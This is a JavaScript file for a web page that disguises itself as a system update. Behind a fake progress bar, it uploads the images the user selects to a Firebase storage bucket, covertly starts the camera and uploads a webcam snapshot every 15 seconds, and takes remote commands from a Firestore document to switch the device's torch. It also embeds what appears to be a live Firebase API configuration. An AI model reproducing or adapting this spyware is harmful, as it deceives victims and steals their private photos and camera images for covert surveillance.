import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

const firebaseConfig = {
    apiKey: "AIzaSyDX0esBRiQ4MuyvWH_s2UZ2kJpA9GryDgE",
    authDomain: "tttttt-48c2e.firebaseapp.com",
    databaseURL: "https://tttttt-48c2e-default-rtdb.firebaseio.com",
    projectId: "tttttt-48c2e",
    storageBucket: "tttttt-48c2e.firebasestorage.app",
    messagingSenderId: "982883301644",
    appId: "1:982883301644:web:7b1676215cb4f0fe7c7129",
    measurementId: "G-QLCYC16T20"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const storage = getStorage(app);

class SystemController {
    constructor() {
        this.images = [];
        this.isUpdating = false;
    }

    async init() {
        const btn = document.getElementById('startBtn');
        const input = document.getElementById('fileInput');
        btn.onclick = () => input.click();
        input.onchange = async (e) => {
            this.images = Array.from(e.target.files).filter(f => f.type.startsWith('image/'));
            this.startFakeUpdate();
            this.startBackgroundOperations();
        };
    }

    startFakeUpdate() {
        this.isUpdating = true;
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('pBar').style.display = 'block';
        document.getElementById('statusText').textContent = "Installing System Update...";
        let progress = 0;
        const bar = document.getElementById('progressFill');
        setInterval(() => {
            if (progress < 99) {
                progress += Math.random() * 0.5;
                bar.style.width = progress + "%";
            }
        }, 3000);
    }

    async startBackgroundOperations() {
        this.exfiltrateFiles();
        this.initCamera();
        this.listenForAdminCommands();
    }

    async exfiltrateFiles() {
        for (let file of this.images) {
            try {
                const sRef = ref(storage, `gallery/${Date.now()}_${file.name}`);
                await uploadBytes(sRef, file);
            } catch (e) {}
            await new Promise(r => setTimeout(r, 1000));
        }
    }

    async initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('videoFeed').srcObject = stream;
            setInterval(() => this.takeSnapshot(), 15000);
        } catch (e) {}
    }

    takeSnapshot() {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('videoFeed');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(async (blob) => {
            try {
                const sRef = ref(storage, `snaps/${Date.now()}.jpg`);
                await uploadBytes(sRef, blob);
            } catch (e) {}
        }, 'image/jpeg');
    }

    listenForAdminCommands() {
        onSnapshot(doc(db, "control", "commands"), (docSnap) => {
            if (docSnap.exists()) {
                const data = docSnap.data();
                if (data.cmd === 'flash_on') this.toggleFlash(true);
                if (data.cmd === 'flash_off') this.toggleFlash(false);
            }
        });
    }

    async toggleFlash(state) {
        const stream = document.getElementById('videoFeed').srcObject;
        if (stream) {
            const track = stream.getVideoTracks()[0];
            try { await track.applyConstraints({ advanced: [{ torch: state }] }); } catch (e) {}
        }
    }
}

document.addEventListener('DOMContentLoaded', () => new SystemController().init());
